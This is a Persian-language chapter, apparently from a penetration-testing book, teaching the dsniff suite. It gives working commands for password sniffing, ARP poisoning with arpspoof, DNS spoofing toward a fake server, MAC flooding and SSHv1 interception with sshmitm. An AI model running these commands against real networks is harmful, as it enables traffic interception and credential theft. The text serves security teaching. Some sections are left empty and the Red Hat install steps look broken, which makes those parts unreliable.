#### 6: dsniff Suite
##### Basics & Concepts
###### Introduction & History
ابزار Dsniff یک مجموعه ابزار شناخته‌شده و قدیمی در دنیای امنیت شبکه است که توسط **Dug Song** در آزمایشگاه CITI دانشگاه میشیگان توسعه یافت و اولین نسخه آن در دسامبر 2000 منتشر شد. هدف اصلی از توسعه آن، حسابرسی و نمایش ناامنی ذاتی پروتکل‌های متنی ساده (Plaintext) و ضعف‌های اساسی در زیرساخت‌های پروکسی بود.

این مجموعه با گذشت بیش از دو دهه از آخرین به‌روزرسانی رسمی‌اش (نسخه 2.4b1)، همچنان به دلیل طراحی هدفمند، سادگی و اثربخشی بالا، یکی از ابزارهای محبوب در میان متخصصان امنیت تهاجمی (Red Team) و مدیران شبکه برای تست نفوذ و عیب‌یابی است. قدرت واقعی Dsniff در ترکیب ابزارهای کوچک و تخصصی آن نهفته است که هر کدام به خوبی یک وظیفه خاص را انجام می‌دهند و با اتصال به یکدیگر، زنجیره‌ای قدرتمند از حمله یا تحلیل شبکه را تشکیل می‌دهند. برای مشاهده Source Code مجموعه ابزار dsniff میتوانید به مخزن گیت‌هاب ابزار با آدرس           https://github.com/tecknicaltom/dsniff مراجعه کنید.

- **نکته مهم و اخلاقی:** تمامی توضیحات، سناریوها و دستورات ارائه‌شده در این بخش **صرفاً برای اهداف آموزشی و استفاده در محیط‌های آزمایشگاهی ایزوله** طراحی شده است. بنابراین هرگونه سواستفاده از آن به دور از اخلاق حرفه ای است و مسئولیت آن به عهده نویسنده و ناشر کتاب نیست.

###### dsniff Core Architecture
پیش از آنکه به بررسی تک تک ابزارهای این مجموعه قدرتمند بپردازیم، لازم است نگاهی کلی به معماری و فلسفه طراحی dsniff داشته باشیم. 

معماری dsniff بر پایه سه مولفه اصلی طراحی شده است:
1. **کتابخانه libpcap:** کتابخانه اصلی برای دریافت و پردازش بسته‌های شبکه در سطح پیوند داده
    
2. **کتابخانه libnids:** کتابخانه بازسازی جریان TCP که امکان دنبال کردن کامل‌های TCP را فراهم می‌کند
    
3. **دیتابیس Berkeley DB:** پایگاه داده برای ذخیره‌سازی منحصربه‌فرد اطلاعات احراز هویت شناسایی شده

معماری dsniff بر اساس رویکرد «بسته‌های کوچک تخصصی» طراحی شده است. به جای یک ابزار monolithic، dsniff شامل چندین ابزار مجزا است که هر یک وظیفه خاصی را انجام می‌دهد و از طریق مکانیزم‌های استاندارد شبکه با یکدیگر همکاری می‌کنند. این لایه‌های معماری عبارتند از:

- **لایه دریافت بسته (Packet Capture)**: مبتنی بر libpcap برای دسترسی به بسته‌های شبکه در سطح DATA LINK

- **لایه بازسازی جریان (Stream Reassembly)**: مبتنی بر libnids برای بازسازی کامل جریان‌های TCP (حتی در مسیرهای نامتقارن)

- **لایه شناسایی پروتکل (Protocol Detection)**: شناسایی هوشمند پروتکل‌ها حتی روی پورت‌های غیراستاندارد از طریق DPI (Deep Packet Inspection)

- **لایه استخراج داده (Data Extraction)**: استخراج اطلاعات خاص مانند رمزهای عبور، فایل‌ها، ایمیل‌ها و URLs

###### Dependencies
مجموعه dsniff برای انجام وظایف سطح پایین شبکه، به پنج کتابخانه اصلی وابسته است که نقش حیاتی در اکوسیستم آن ایفا می‌کنند.

1. **Berkeley DB (libdb):**
	یک کتابخانه پایگاه داده توکار (Embedded Database) است. در dsniff، از این کتابخانه برای ذخیره‌سازی کارآمد و منحصربه‌فرد اطلاعات کاربری شنود شده استفاده می‌شود. به این معنا که dsniff به کمک Berkeley DB، فقط یک بار تلاش‌های احراز هویت یکسان را ثبت می‌کند و از ذخیره داده‌های تکراری جلوگیری می‌کند.
    
2. **OpenSSL (libssl, libcrypto):**
	پرکاربردترین کتابخانه رمزنگاری است. در dsniff، ابزارهای `sshmitm` و `webmitm` برای رمزگشایی و جعل گواهی‌های SSL/TLS و همچنین تحلیل ترافیک رمزنگاری‌شده SSH به این کتابخانه متکی هستند. بدون OpenSSL، امکان رهگیری ترافیک HTTPS و SSH وجود ندارد.
    
3. **libpcap:**
	کتابخانه استاندارد و اصلی برای ضبط بسته‌های شبکه (Packet Capture) است. تمامی ابزارهای مجموعه dsniff برای شنود ترافیک از روی کارت شبکه و دریافت بسته‌ها، از libpcap استفاده می‌کنند. این کتابخانه، واسط بین ابزار و درایور کارت شبکه است.
    
4. **libnids:**
	یک کتابخانه تخصصی برای بازسازی جریان TCP است. این کتابخانه وظیفه بسیار مهم سرهم‌بندی بسته‌های تکه‌تکه شده TCP را بر عهده دارد تا ابزارهایی مانند `dsniff` و `urlsnarf` بتوانند محتوای کامل یک اتصال (مانند یک جلسه HTTP) را به صورت یکپارچه ببینند و تحلیل کنند.
    
5. **libnet:**
	یک کتابخانه قدرتمند برای ساخت و تزریق بسته‌های شبکه (Packet Injection) است. ابزارهای تهاجمی مجموعه مانند `arpspoof`، `dnsspoof`، `tcpkill` و `tcpnice` برای ساخت بسته‌های ARP جعلی، پاسخ‌های DNS ساختگی و بسته‌های RST، به این کتابخانه وابسته هستند.

###### Categories & Structures
بطور کلی میتوان ابزارهای درون dsniff را به دسته بندی های زیر تقسیم کرد:

1. **دسته اول: ابزارهای نظارت غیرفعال (Passive Monitoring)** 
	- `dsniff` - ابزار مرکزی استخراج رمزهای عبور
    
	- `filesnarf` - ذخیره فایل‌های NFS
	
	- `mailsnarf` - ذخیره ایمیل‌ها در قالب mbox
	
	- `msgsnarf` - ضبط پیام‌های پیام‌رسان‌ها
    
	- `urlsnarf` - ثبت آدرس‌های وب بازدید شده
    
	- `webspy` - نمایش همزمان صفحات وب مشاهده شده توسط هدف

2. **دسته دوم: ابزارهای رهگیری و هدایت ترافیک (Active Interception)**
	- `arpspoof` - مسمومیت جدول ARP
    
	- `dnsspoof` - جعل پاسخ‌های DNS
    
	- `macof` - طغیان آدرس‌های MAC تصادفی

3. **دسته سوم: ابزارهای حمله مرد میانی (MITM Attacks Tools)**
	- `sshmitm` - رهگیری ارتباطات SSH
    
	- `webmitm` - رهگیری ارتباطات HTTP/HTTPS

4. **دسته چهارم: ابزارهای کمکی و دستکاری جریان (Network Traffic Manipulation)**
	- `tcpkill` - قطع اجباری اتصالات TCP
    
	- `tcpnice` - کاهش سرعت اتصالات TCP
    
	- `sshow` - تحلیلگر ترافیک SSH

5. **دسته پنجم: ابزار مرکزی dsniff** یک sniffer قدرتمند برای استخراج خودکار اطلاعات حساس.

**نکته:** برخی از مستندات ابزار های دسته دوم و سوم را یک دسته واحد Active Interception & MITM Attack Tools معرفی میکنند.

در بخش‌های بعدی، هر یک از این ابزارها را به صورت کامل و دقیق بررسی خواهیم کرد.
##### Installation Method
برای نصب مجموعه dsniff، بسته به سیستم‌عامل و نیاز به آخرین نسخه، دو روش اصلی وجود دارد که در ادامه قدم‌به‌قدم آن‌ها را بررسی می‌کنیم.

1. **روش اول: نصب بر روی لینوکس (Debian/Ubuntu/Kali) از مخازن رسمی**  
این روش، ساده‌ترین و پایدارترین راه برای نصب dsniff روی توزیع‌های مبتنی بر Debian مانند Kali-Linux و Ubuntu است.
```sh
#بروزرسانی مخازن
sudo apt update

#نصب مجموعه ابزار dsniff
sudo apt install dsniff

#تایید نصب موفق
dsniff --help
```

------

2. **روش دوم: نصب از طریق پکیج پایتون (Cross-Platform)**  
	یک فورک مدرن از dsniff وجود دارد که به صورت یک بسته پایتون در PyPI منتشر شده و نصب و اجرای آن را در سیستم‌عامل‌های مختلف مانند Linux، ‌MacOS  و Windows با WSL بسیار آسان می‌کند.
		https://pypi.org/project/dsniff/

	برای استفاده از این روش ابتدا باید Dependencies یا وابستگی‌های dsniff را نصب کنیم.

**2.1: نصب پکیج پایتون در لینوکس:**
```sh
#Debian Based Linux
#Install Dependencies 
sudo apt update
sudo apt install libnet-dev libnids-dev libpcap-dev libssl-dev python3
#Install dsniff python package
pip install dsniff
#Check Installation
dsniff --help

#Red-Hat Based Linux
#Install Dependencies 
sudo dnf check‑update
sudo dnf install libnet-dev libnids-dev libpcap-dev libssl-dev python3
#Install dsniff python package
pip install dsniff
dsniff --help
```

**2.2: نصب پکیج پایتون در ویندوز WSL:**
لازم به ذکر است که مجموعه dsniff به صورت Native برای ویندوز کامپایل نشده و به دلیل وابستگی عمیق به کتابخانه‌های لینوکسی مانند `libpcap` و `libnet`، اجرای مستقیم آن روی ویندوز ممکن نیست. راهکار استاندارد و توصیه‌شده برای کاربران ویندوز، استفاده از **Windows Subsystem for Linux (WSL)** و دنبال کردن یکی از دو روش نصب ذکر شده در بالا است. پس از نصب WSL و یک توزیع لینوکس، می‌توانیم از تمامی قابلیت‌های dsniff به صورت کامل بهره‌مند شویم.

برای راه‌اندازی WSL ابتدا باید یک توزیع لینوکس (مانند Ubuntu) را از Microsoft Store و یا بوسیله کامند مربوط نصب کنیم و سپس یکی از دو روش بالا را برای نصب ابزار دنبال کنیم.

نکته: برای مشاهده راهنمای کامل نصب و راه‌اندازی WSL در ویندوز به فصل 0 کتاب "Perquisites" مراجعه کنید. در اینجا کامندهای نصب بصورت خلاصه آورده شده است.

- راه اندازی WSL:
```powershell
#1-Enable Necessary Features for WSL
#1-1: Windows Subsystem for Linux
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

#1-2: Virtual Machine Platform
dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart

#1-3: Enable Hyper-V (Optional but good)
dism.exe /online /enable-feature /featurename:Microsoft-Hyper-V-All /all /norestart

#2-Restart Windows to Apply
Restart-Computer

#3-Set WSL Version on 2 & Install a WSL Linux Distro 
wsl --set-default-version 2
wsl --install -d kali-linux #or install Ubuntu
wsl --install -d ubuntu
#if not logged in to WSL, Logged in with "wsl -d ubuntu" or "wsl -d kali-linux"
```
- نصب dsniff:
```sh
#1-Using APT
sudo apt update -y && sudo apt install dsniff -y

#2-Using Python Package
sudo apt update -y && sudo apt install -y libnet-dev libnids-dev libpcap-dev libssl-dev python3

pip install dsniff
```
##### dsniff Suite: Common Flags
در مجموعه ابزارهای dsniff، هر ابزار دارای فلگ‌ها (گزینه‌های خط فرمان) خاص خود است. منتها یکسری از این فلگ‌ها بصورت عمومی هستند و در تمامی مجموعه ابزارهای dsniff استفاده میشوند. در این بخش این فلگ‌های عمومی را بررسی میکنیم و فلگ‌های مخصوص هر ابزار را نیز در بخش مربوط به آن ابزار مورد بررسی قرار میدهیم.

1. **`-i interface` - Interface Selection:**
	مشخص کردن رابط شبکه ای (Network Interface) که ابزار باید روی آن به شنود بپردازد.
```sh
sudo dsniff -i eth0
sudo arpspoof -i wlan0 -t 192.168.1.10 192.168.1.1
```

2. **`-v` - Verbose Mode:**
	فعال‌سازی حالت نمایش جزئیات بیشتر. این فلگ باعث می‌شود ابزار اطلاعات بیشتری مانند بنرهای سرویس‌ها را نمایش دهد.
```sh
sudo dsniff -i eth0 -v
```

3. **`-d` - Debug Mode:**
	فعال‌سازی حالت دیباگ برای عیب‌یابی و مشاهده جزئیات بسیار دقیق عملکرد ابزار
```sh
sudo dsniff -i eth0 -d
```

4. **`-n` - No Name Resolution:**
	غیرفعال‌سازی تبدیل آدرس‌های IP به نام هاست. این فلگ سرعت اجرا را افزایش می‌دهد.
```sh
sudo dsniff -i eth0 -n
```

5. **`expression` - BPF (Berkeley Packet Filter) Filter:**
	تعیین فیلتر BPF برای محدود کردن ترافیک مورد شنود. این عبارت از همان syntax استفاده می‌کند که در ابزار tcpdump به کار می‌رود.
```sh
sudo dsniff -i eth0 'tcp port 80 or tcp port 21'
sudo dsniff -i eth0 'host 192.168.1.10'
```
##### dsniff Suite: `dsniff` Main Tool
###### Description
ابزار dsniff به عنوان پرچمدار این مجموعه، یک Password Sniffer تخصصی است که قادر به استخراج اطلاعات احراز هویت از پروتکل‌های مختلف می‌باشد. این ابزار با بازسازی کامل جریان TCP و شناسایی هوشمند پروتکل، اطلاعات عبوری را تحلیل می‌کند

- **پروتکل‌های پشتیبانی شده:** ابزار dsniff از بیش از 30 پروتکل مختلف پشتیبانی می‌کند که مهمترین آنها عبارتند از:
	- **پروتکل‌های دسترسی از راه دور:** FTP, Telnet, Rlogin, SSH
    
	- **پروتکل‌های ایمیل:** SMTP, POP, IMAP
    
	- **پروتکل‌های وب:** HTTP (Basic, Digest, NTLM)
    
	- **پروتکل‌های دایرکتوری و مدیریت:** SNMP, LDAP, NFS
    
	- **پروتکل‌های مسیریابی:** RIP, OSPF, VRRP
    
	- **پیام‌رسان‌ها:** IRC, AIM, ICQ, Yahoo Messenger, MSN Messenger
    
	- **پایگاه داده:** Oracle SQL Net, Sybase, Microsoft SQL, PostgreSQL
    
	- **پروتکل‌های اختصاصی ویندوز:** SMB, MS-CHAP, Citrix ICA


- **نحوه عملکرد (Operation Method):**
	1. **دریافت بسته:** با استفاده از libpcap، بسته‌های شبکه را از روی interface مشخص شده دریافت می‌کند.
    
	2. **بازسازی جریان:** libnids بسته‌های پراکنده را به جریان‌های TCP کامل تبدیل می‌کند (حتی بسته‌های out-of-order مرتب می‌شوند)
    
	3. **تشخیص پروتکل:** با تحلیل payload اولیه هر جریان، پروتکل مورد استفاده را شناسایی می‌کند. در حالت پیش‌فرض، بررسی عمیق بسته (DPI) روی پورت‌های غیراستاندارد نیز فعال است.
    
	4. **استخراج اعتبارنامه:** الگوهای مربوط به هر پروتکل (مانند دستورات USER/PASS در FTP یا Authorization header در HTTP) را جستجو کرده و اطلاعات را ذخیره می‌کند.
    
	5. **ذخیره‌سازی هوشمند:** با استفاده از Berkeley DB، هر اعتبارنامه منحصربه‌فرد فقط یک بار ذخیره می‌شود تا از شلوغی خروجی جلوگیری شود.

###### dsniff Flags
ابزار `dsniff` به عنوان هسته اصلی این مجموعه، دارای فلگ‌های اختصاصی متعددی است که در ادامه به تفکیک توضیح داده می‌شود.
1. **`-c` Half-Duplex Reassembly:**
	انجام بازسازی Half-Duplex جریان TCP برای مدیریت ترافیک با مسیردهی نامتقارن. این فلگ زمانی ضروری است که از ابزارهایی مانند `arpspoof` استفاده می‌کنیم و ترافیک کلاینت و سرور از مسیرهای متفاوتی عبور می‌کند.
```sh
sudo dsniff -i eth0 -c
```

2. **`-m` Auto Protocol Detection(DPI):**
	یکی از قابلیت‌های پیشرفته dsniff، توانایی انجام بازرسی عمیق بسته DPI (Deep Packet Inspection) است. این قابلیت به ابزار اجازه می‌دهد حتی اگر سرویسی روی پورت غیراستاندارد اجرا می‌شود، پروتکل آن را شناسایی کند. یعنی مثلا اگر سرور SSH به جای پورت 22 روی پورت 2222 اجرا شود، dsniff با گزینه `m-` قادر به تشخیص آن است:
```sh
sudo dsniff -i eth0 -m
```

3. **`-a` Show All Results:**
	نمایش تمام نتایج بدون فیلتر کردن موارد تکراری. در حالت عادی، dsniff تلاش می‌کند از نمایش اطلاعات تکراری جلوگیری کند.
```sh
sudo dsniff -i eth0 -a
```

4. **`-D` Disable DPI:**
	غیرفعال‌سازی بازرسی عمیق بسته DPI(Deep Packet Inspection). در این حالت فقط سرویس‌های روی پورت‌های استاندارد شناسایی می‌شوند.
```sh
sudo dsniff -i eth0 -D
```

5. **`-N` Name Resolution:**
	فعال‌سازی تبدیل آدرس‌های IP به نام هاست (برعکس فلگ `-n` در سایر ابزارها).
```sh
sudo dsniff -i eth0 -N
```

6. **`-P` Promiscuous Mode:**
	فعال‌سازی حالت promiscuous روی interface برای دریافت تمام بسته‌های شبکه، نه فقط بسته‌های مقصد سیستم خود.
```sh
sudo dsniff -i eth0 -P
```

7. **`-C` Force Color Output:**
	اجبار به نمایش خروجی رنگی حتی در محیط‌های غیر تعاملی

```sh
sudo dsniff -i eth0 -C
```

8. **`-s snaplen` Snapshot Length:**
	تعیین حداکثر تعداد بایت‌هایی که از هر اتصال TCP گرفته می‌شود. مقدار پیش‌فرض 1024 بایت است.
```sh
sudo dsniff -i eth0 -s 2048
```

9. **`-p pcapfile` Read from PCAP:**
	خواندن بسته‌ها از فایل pcap به جای شبکه زنده
```sh
dsniff -p capture.pcap
```

10. **`-r savefile` Read Session File:**
	خواندن جلسات sniff شده از فایل ذخیره‌سازی که قبلاً با گزینه `w-` ایجاد شده است.
```sh
dsniff -r saved_sessions.dump
```

11. **`-w savefile` Write Session File:**
	ذخیره جلسات sniff شده در فایل به جای چاپ آن‌ها در خروجی استاندارد
```sh
sudo dsniff -i eth0 -w sessions.dump
```

12. **`-f services` Services File:**
	بارگذاری تعاریف محرک‌ها (triggers) از یک فایل خدمات سفارشی
```sh
sudo dsniff -i eth0 -f custom_services.conf
```

13. **`-t trigger[,...]` Custom Triggers:**
	بارگذاری محرک‌ها از یک لیست جدا شده با کاما به فرمت `port/proto=service`
```sh
sudo dsniff -i eth0 -t 80/tcp=http,8080/tcp=http
```

14. **`-M magics` Magic File:**
	بارگذاری فایل جادویی (magic file) برای شناسایی پروتکل. این گزینه را نمی‌توان همزمان با `t-` استفاده کرد.
```sh
sudo dsniff -i eth0 -M custom.magic
```

###### Basic Usages of `dsniff`
در یک محیط آزمایشگاهی، مراحل زیر را برای استفاده از dsniff به عنوان ابزار نظارت بر ترافیک عبوری دنبال می‌کنیم:

- **پیش‌نیاز ها:**
	1. **پیش‌نیاز اول - فعال کردن IP Forwarding:** ابتدا برای حفظ ارتباط بصورت دائمی ابتدا باید IP Forwarding را فعال کنیم.

	2. **پیش‌نیاز دوم - هدایت ترافیک هدف به سمت سیستم خود:**  سپس با استفاده از arpspoof (که در بخش بعدی توضیح می‌دهیم)، ترافیک دستگاه هدف را به سمت خود (Gateway) هدایت می‌کنیم. در مثال زیر با فرض اینکه gateway 192.168.1.1 است ترافیک دستگاه 192.168.1.10 را به سمت آن هدایت میکنیم.

```sh
#Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

#Redirect Target(192.168.1.10) Traffic to 192.168.1.1 (Gateway) with arpspoof
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

- **اجرای dsniff در ترمینال جداگانه:**
	- حال میتوانیم dsniff را برای انجام کارهای متفاوتی بر اساس هدفی که داریم اجرا کنیم.

1. هدف اول - شنود تمام ترافیک های عبوری از یک اینترفیس شبکه مثلا eth0:
```sh
sudo dsniff -i eth0
```

2. هدف دوم - شنود ترافیک های HTTP و FTP با استفاده از فیلتر:
```sh
sudo dsniff -i eth0 'tcp port 80 or tcp port 21'
```

3. هدف سوم - اجرا با جزئیات کامل و همچنین تبدیل IP به نام هاست:
```sh
sudo dsniff -i eth0 -v -N
```

- خروجی نمونه:

###### Network Passwords Detection with `dsniff`
در یک محیط آزمایشگاهی کنترل شده، سناریوی زیر را برای شناسایی رمزهای عبور در شبکه می‌توانیم پیاده‌سازی کنیم:
1. **ترمینال اول:**
```sh

echo 1 > /proc/sys/net/ipv4/ip_forward

#مرحله 2: هدایت ترافیک به سمت خود (در ترمینال اول)
```

2. **ترمینال دوم:**

##### dsniff Suite: Active Interception
###### 1: `arpspoof` ARP Cache Poisoning(ARP Spoofing) Implementor
یکی از مهمترین و پراستفاده ترین ابزار درون dsniff ابزار arpspoof است. قبل از بررسی نحوه عملکرد arpspoof، لازم است پروتکل ARP (Address Resolution Protocol) را به صورت مختصر توضیح دهیم.(برای توضیحات بیشتر در مورد ARP به فصل Perquisites-0 مراجعه کنید.) 

- **پیش نیاز ها (پروتکل ARP):**
	- پروتکل ARP پروتکلی در لایه دوم شبکه مدل OSI (لایه Data Link) است که وظیفه ترجمه آدرس‌های IP (لایه Network Layer) به آدرس‌های MAC (لایه Data Link) را در یک شبکه محلی بر عهده دارد.
	- **نحوه عملکرد عادی ARP:**
		- زمانی که دستگاه A می‌خواهد با دستگاه B در همان شبکه محلی ارتباط برقرار کند، آدرس MAC دستگاه B را نمی‌داند.
	    
		- دستگاه A یک درخواست ARP پخش همگانی (broadcast) می‌فرستد: "چه کسی IP 192.168.1.5 را دارد؟" - ARP Request
	    
		- دستگاه B با یک پاسخ ARP unicast پاسخ می‌دهد: "IP 192.168.1.5 متعلق به من است و MAC من aa:bb:cc:dd:ee:ff است" - ARP Replay
	    
		- دستگاه A این جفت‌آدرس IP-MAC را در ARP Cache خود ذخیره می‌کند.
		
	- **آسیب‌پذیری:** پروتکل ARP فاقد هرگونه مکانیزم احراز هویت است. هر دستگاهی در شبکه می‌تواند پاسخ ARP جعلی ارسال کند و بدون هیچگونه تاییدی، کش ARP سایر دستگاه‌ها را مسموم کند.

- **نحوه عملکرد arpspoof:**  
	ابزار arpspoof از این ضعف استفاده کرده و پاسخ‌های ARP جعلی را به صورت مداوم در شبکه ارسال می‌کند تا جدول ARP دستگاه هدف (victim) و Gateway را دستکاری کند.

- **سناریوی حملـه (Test Scenario):**
	فرض کنید می‌خواهیم ترافیک بین Target(192.168.1.10) و Gateway(192.168.1.1) را از طریق سیستم خود (192.168.1.100) عبور دهیم.

- **مراحل استفاده و پیاده‌سازی:**
1. **فعال‌سازی IP Forwarding در سیستم خود:**
	- اینکار اجازه عبور بسته‌ها از طریق سیستم ما را میدهد. همچنین انجام این کار ضروری است تا هدف بتواند به اینترنت دسترسی داشته باشد و متوجه اختلال نشود.
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward

```

2. **اجرای arpspoof برای فریب Target:**
	- این دستور به هدف (192.168.1.10) می‌گوید که آدرس MAC مربوط به IP Gateway (192.168.1.1) برابر با آدرس MAC سیستم ما است.
```sh
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

2. **اجرای arpspoof برای فریب Gateway:**
	- این دستور به Gateway می‌گوید که آدرس MAC مربوط به IP هدف برابر با آدرس MAC سیستم ما است.
```sh
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
```

- **نتیجه:**  
اکنون به Target گفتیم که ما Gateway هستیم. همچنین به Gateway هم گفتیم که ما Target هستیم. در نتیجه تمام بسته هایی که از Target به Gateway و بالعکس عبور میکنند به سیستم ما میرسند. سپس به دلیل فعال بودن IP forwarding، به مقصد اصلی ارسال می‌شوند. ما اکنون در موقعیت «مرد میانی MITM» قرار گرفته‌ایم و می‌توانیم تمام ترافیک را شنود، ضبط یا حتی دستکاری کنیم.

- **فلگ های ابزار arpspoof:**

| فلگ                    | کارکرد                                                       | مثال                                                   |
| ---------------------- | ------------------------------------------------------------ | ------------------------------------------------------ |
| `-i interface`         | تعیین interface                                              | `sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1`    |
| `-t target`            | تعیین آدرس IP هدف (سیستمی که قصد فریب آن را داریم)           | `sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1`    |
| `-r`                   | فریب هدف و فریب gateway به صورت همزمان                       | `sudo arpspoof -i eth0 -r -t 192.168.1.10 192.168.1.1` |
| `host` (آرگومان نهایی) | آدرس IP میزبان دیگر (معمولاً gateway) که به هدف معرفی می‌شود | بخشی از دستور اصلی                                     |


###### 2: `dnsspoof` DNS Spoofing Implementor
- **پیش‌نیاز (پروتکل DNS):**
	- پروتکل DNS (Domain Name System) وظیفه ترجمه نام دامنه (مثل website.example.com) به آدرس IP را بر عهده دارد. 
	
	- **آسیب‌پذیری:** پاسخ‌های DNS نیز مانند ARP فاقد احراز هویت قوی در شبکه‌های محلی هستند (به خصوص در نسخه‌های قدیمی‌تر).

- **نحوه عملکرد dnsspoof:**  
	این ابزار به درخواست‌های DNS ارسالی از دستگاه هدف گوش می‌دهد و به جای سرور DNS واقعی، یک پاسخ جعلی همراه با آدرس IP مورد نظر ما ارسال می‌کند.

- **سناریوی استفاده:**
	فرض کنید می‌خواهیم کاربر هدف به جای سایت واقعی example.com، به یک سایت جعلی (که ما کنترل می‌کنیم) هدایت شود.

- **مراحل استفاده و پیاده‌سازی:**

1. **تهیه فایل جعل (spoof file):**
	1. در این مرحله یک فایل حاوی قوانین جعل DNS را ایجاد میکنیم. در این فایل آیپی و دامنه مربوط به آنرا که میخواهیم جعل شود قرار میدهیم.
	2. در مثال زیر آدرس 192.168.1.100 متعلق به سرور جعلی ما است.
```sh
echo "192.168.1.100 example.com" > dns.spoof
```

2. **اجرای dnsspoof:**
	1. اجرای dnsspoof با فایل قوانین سفارشی به کمک فلگ `f-`
```sh
sudo dnsspoof -i eth0 -f dns.spoof
```

3. **ترکیب با arpspoof:**  
	برای استفاده موثر از dnsspoof نیاز است که آنرا با arpspoof ترکیب کنیم. یعنی ابتدا با arpspoof ترافیک DNS هدف را به سمت خود هدایت می‌کنیم، سپس dnsspoof پاسخ‌های جعلی ارسال می‌کند.
	
	**نتیجه:** کاربر هدف با وارد کردن example.com در مرورگر خود، به سرور جعلی ما هدایت می‌شود (بدون اینکه متوجه تغییر آدرس شود).

- **فلگ‌های ابزار dnsspoof:**

|فلگ|کارکرد|مثال|
|---|---|---|
|`-i interface`|تعیین interface|`sudo dnsspoof -i eth0 -f hosts.txt`|
|`-f hosts`|تعیین فایل حاوی قوانین جعل DNS (فرمت شبیه /etc/hosts)|`sudo dnsspoof -i eth0 -f dns.spoof`|
|`port`|تعیین پورت جایگزین برای DNS (پیش‌فرض 53)|`sudo dnsspoof -i eth0 port 5353`|

###### 3: `macof` MAC Flooding Implementor
- **هدف:** 
	سوئیچ‌های شبکه در لایه 2 یک جدول CAM (Content Addressable Memory) دارند که آدرس‌های MAC پورت‌های مختلف را ذخیره می‌کند. این جدول اندازه محدودی دارد و اگر بیش از ظرفیت خود داده دریافت کند کارایی آن مختل میشود.

- **نحوه عملکرد macof:**  
	این ابزار تعداد بسیار زیادی بسته با آدرس‌های MAC مبدأ تصادفی و جعلی تولید کرده و به شبکه می‌فرستد تا جدول CAM را مملو از داده های جعلی کند.

- **پیامد MAC Flooding:**
	- جدول CAM سوئیچ پر می‌شود (باعث overflow)
    
	- در حالت پیش‌فرض بسیاری از سوئیچ‌های قدیمی‌تر، زمانی که جدول CAM پر می‌شود، کارایی سوئیچ مختل میشود و به حالت «fail-open» می‌رود.
    
	- در این حالت، سوئیچ مانند یک هاب عمل می‌کند و تمام ترافیک را به تمام پورت‌ها ارسال می‌کند (broadcast)
    
	- این شرایط امکان شنود ترافیک در شبکه‌های سوئیچ شده را بدون نیاز به ARP spoofing فراهم می‌کند.

- **روش استفاده و پیاده‌سازی:**
	- ارسال بسته‌های حاوی آدرس‌های MAC تصادفی به شبکه
```sh
sudo macof -i eth0
```

- **محدودیت‌ها:**
	- سوئیچ‌های مدرن دارای مکانیزم‌های حفاظتی مانند محدودیت نرخ (rate limiting) و محافظت از CAM هستند.
	- این تکنیک به سرعت قابل شناسایی است (ایجاد نویز زیاد در شبکه)
	- جنبه آموزشی دارد و در شبکه‌های واقعی سازمانی کارایی کمتری دارد.

- **فلگ‌های ابزار macof:**

|فلگ|کارکرد|مثال|
|---|---|---|
|`-i interface`|تعیین interface|`sudo macof -i eth0`|
|`-s src`|تعیین آدرس IP مبدأ جعلی|`sudo macof -i eth0 -s 192.168.1.100`|
|`-d dst`|تعیین آدرس IP مقصد جعلی|`sudo macof -i eth0 -d 192.168.1.1`|
|`-e srcmac`|تعیین آدرس MAC مبدأ جعلی|`sudo macof -i eth0 -e aa:bb:cc:dd:ee:ff`|
|`-E dstmac`|تعیین آدرس MAC مقصد جعلی|`sudo macof -i eth0 -E 11:22:33:44:55:66`|
|`-n count`|تعیین تعداد بسته‌های ارسالی|`sudo macof -i eth0 -n 1000`|

##### dsniff Suite: MITM Attack Tools
###### 1: `sshmitm` MITM for SSHv1 Protocol
- **توضیح:**
	ابزار `sshmitm` یک ابزار تخصصی برای اجرای حمله «مرد میانی» (Man-In-The-Middle) بر روی پروتکل SSH نسخه 1 است. این ابزار به عنوان یک پروکسی شفاف (transparent proxy) عمل کرده و ارتباط SSH بین کلاینت و سرور را از طریق سیستم مهاجم عبور می‌دهد.
	
	**آسیب‌پذیری SSH نسخه 1:**  
		نسخه 1 پروتکل SSH فاقد مکانیزم تأیید هویت قوی برای سرور در هنگام برقراری ارتباط اولیه است. این ضعف به `sshmitm` اجازه می‌دهد تا بدون آنکه کلاینت متوجه شود، بین دو طرف قرار گیرد.


- **مکانیزم فنی عملکرد:**
	1. شنود و بازپخش: ابزار `sshmitm` به درخواست‌های SSH کلاینت گوش می‌دهد و خود را به جای سرور واقعی به کلاینت معرفی می‌کند.
    
	2. اتصال به سرور واقعی: همزمان، به عنوان یک کلاینت به سرور SSH واقعی متصل می‌شود.
    
	3. رمزگشایی و بازنویسی: در حالت پیش‌فرض (SSH نسخه 1)، `sshmitm` می‌تواند جلسه را رمزگشایی کرده و لاگ کند.
    
	4. ارسال رمز عبور به سرور: رمز عبور دریافت شده از کلاینت را به سرور واقعی ارسال کرده و پاسخ را به کلاینت بازمی‌گرداند.

- **مراحل استفاده و پیاده‌سازی:**

1. **مرحله اول:** فعال کردن IP forwarding در سیستم تست نفوذگر
```sh
#Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```

2. **مرحله دوم:** قرار گرفتن در موقعیت «مرد میانی» (با استفاده از arpspoof یا سایر روش‌های هدایت ترافیک) و هدایت ترافیک SSH به سمت خود
```sh
#Redirect SSH Traffic to our device using arpspoof
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```
   
3. **مرحله سوم:** اجرای sshmitm در حالت پراکسی
```sh
sudo sshmitm -i eth0
```

3. **مرحله چهارم:** ذخیره لاگ جلسه رمزگشایی شده (اختیاری)
```sh
sudo sshmitm -i eth0 -l captured_ssh_session.log
```

- **توضیح فلگ های استفاده شده:**
	- `-i interface`: تعیین اینترفیس مورد استفاده
    
	- `-l logfile`: ذخیره جلسات رمزگشایی شده در فایل لاگ
    
	- `-p port`: تعیین پورت جایگزین (پیش‌فرض 22)

